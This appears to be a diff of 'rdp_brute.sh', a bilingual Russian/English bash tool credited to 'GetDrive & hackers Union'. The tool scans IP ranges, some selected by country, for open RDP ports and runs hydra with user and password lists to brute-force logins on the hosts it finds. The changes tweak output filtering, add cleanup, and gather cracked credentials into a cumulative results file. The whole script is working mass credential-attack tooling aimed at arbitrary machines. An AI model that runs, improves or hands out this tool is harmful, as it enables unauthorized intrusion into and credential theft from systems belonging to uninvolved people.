@@ -10,6 +10,11 @@ blue="\033[1;34m"
 violet="\033[1;35m"
 aquamarine="\033[1;36m"
 grey="\033[1;37m"
+##########################################CLEAR#######################################
+CLEARALL ()
+{
+rm -rf hydra.restore result paused.conf 2> /dev/null
+}
 ########################################TESTROOT######################################
 TESTROOT()
 {
@@ -21,13 +26,8 @@ if [ $(id -u) -ne 0 ]; then
 fi
 }
 ######################################################################################
-echo -e "                    $yellow*Проверяем права ... *Detect ROOT$colorbase"
-sleep 1
+CLEARALL
 TESTROOT
-clear
-echo -e "                    $yellow*Проверяем права ... *Detect ROOT$colorbase..OK"
-sleep 1
-clear
 echo -e "                    $yellow*Определяем язык...*Detect language"
 sleep 1
 clear
@@ -38,7 +38,7 @@ clear
 echo -e       "$grey                     +-------------------------------------+"
 echo -e       "$grey                     |            Auto  Script             |"
 echo -e "$aquamarine                     |    by GetDrive & hackers Union      |" 
-echo -e        "$red                     |            Version 1.09             |"
+echo -e        "$red                     |            Version 1.10             |"
 echo -e        "$red                     +-------------------------------------+ $colorbase"
 #####################################CHECKLANGUAGE####################################
 CHECKLANGUAGE ()
@@ -283,8 +283,8 @@ read -p "*Укажите путь к файлу со списком пароле
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
-trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 TESTRESULTRU 
 echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
@@ -301,8 +301,8 @@ read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " 
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
-trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 TESTRESULTRU
 echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или не указан пароль"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
@@ -319,8 +319,8 @@ read -p "*Укажите путь к файлу со списком пароле
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
-trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 TESTRESULTRU
 echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или файл с паролями"
 echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
@@ -335,8 +335,9 @@ if [ "$brutmenu" = "4" ]; then
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
-trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
 TESTRESULTRU
 
 
@@ -378,8 +379,8 @@ read -p "*Enter the path to the file with a list of passwords {'/home/dictionary
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
-trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 TESTRESULTEN
 echo -e "\n$red***ERROR! Incorrect login or password file"
 echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
@@ -396,8 +397,8 @@ read -p "*Enter the password {administrator, admin, 123456 & etc.} : " passbrute
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
-trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 TESTRESULTEN
 echo -e "\n$red***ERROR! Incorrect file with login and password unknown"
 echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
@@ -414,8 +415,8 @@ read -p "*Enter the path to passwords dictionary {'/home/dictionary/pass'}: " pa
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
-hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
-trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 TESTRESULTEN
 echo -e "\n$red***ERROR! Incorrect file with logins and passwords file"
 echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
@@ -429,8 +430,8 @@ if [ "$brutmenu" = "4" ]; then
 clear
 echo -e "                              $green Start bruteforceing "
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|[ERROR]'
-trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
+#trap 'echo "Return to Main menu"; exit; ./rdp_brute.sh' 2
 TESTRESULTEN
 echo -e "\n$red***ERROR! File for targets is empty "
 echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase"
@@ -10258,7 +10259,7 @@ fi
 
 MAINBRUTEMENURU
 if [ "$menuoption" = "5" ]; then
- 
+CLEARALL
 exit;
 fi
 fi
@@ -10481,7 +10482,7 @@ echo -e "   |        $grey 1.$yellow Scan range to find an open RDP port (manual
 echo -e "   |        $grey 2.$yellow Scan range to find an open RDP port (from a file)$colorbase          | ";
 echo -e "   |        $grey 3.$yellow Bruteforce Username/Password (last scan)$colorbase                   | ";
 echo -e "   |        $grey 4.$yellow Selecting the range of IP for the country $colorbase                 | ";
-echo -e "   |        $grey 5.$yellow Exit ($red ENTER $yellow) $colorbase                                            | ";
+echo -e "   |        $grey 5.$yellow Exit ($red[ENTER]$yellow) $colorbase                                            | ";
 echo -e "   +-----------------------------------------------------------------------+"
 read -p "                              Сhoose from a menu : " menuoption
 
@@ -19890,6 +19891,7 @@ fi
 ######################################TESTRESULTRU#######################################
 TESTRESULTRU ()
 {
+cat result >> all_results
 if grep -E 'host|login|password' result;
 	then
 	echo ""
@@ -19920,6 +19922,7 @@ fi
 ######################################TESTRESULTEN######################################
 TESTRESULTEN ()
 {
+cat result >> all_results
 if  grep -E 'host|login|password' result 
 	then
 	echo ""
